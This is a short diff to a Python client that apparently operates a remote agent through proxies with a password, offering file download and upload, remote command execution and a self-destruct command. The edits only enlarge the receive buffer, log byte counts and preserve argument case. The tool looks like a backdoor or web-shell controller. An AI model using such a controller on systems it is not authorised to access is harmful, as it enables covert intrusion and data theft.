@@ -96,7 +96,7 @@ def sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
 
     start = time.perf_counter()
     s.sendall(data)
-    data = s.recv(1024)
+    data = s.recv(65536)
     end = time.perf_counter()
     s.close()
 
@@ -105,7 +105,7 @@ def sendrecv(addr: tuple[str, int], sendbuf: bytes) -> bytes:
     if len(data) == 0:
         raise Exception("[!] auth failed")
     
-    print('recv:', data)
+    print(f'recv ({len(data)} bytes):', data)
 
     return data
 
@@ -174,19 +174,19 @@ def main(argv):
     print(proxy_list)
 
     while True:
-        argv = input("$ ").lower().strip(" ").split()
+        argv = input("$ ").strip(" ").split()
         if argv == []:
             continue
-        if argv[0] == "download":
+        elif argv[0].lower() == "download":
             download(proxy_list, password, argv[1])
-        elif argv[0] == "upload":
+        elif argv[0].lower() == "upload":
             upload(proxy_list, password, argv[1], argv[2])
-        elif argv[0] == "[self-destruct]":
+        elif argv[0].lower() == "[self-destruct]":
             server_exit(proxy_list, password)
             break
-        elif argv[0] == "cd":
+        elif argv[0].lower() == "cd":
             pwd = os.path.normpath(os.path.join(pwd, argv[1]))
-        elif argv[0] == "exit":
+        elif argv[0].lower() == "exit":
             break
         else:
             exec(proxy_list, password, pwd, ' '.join(argv))
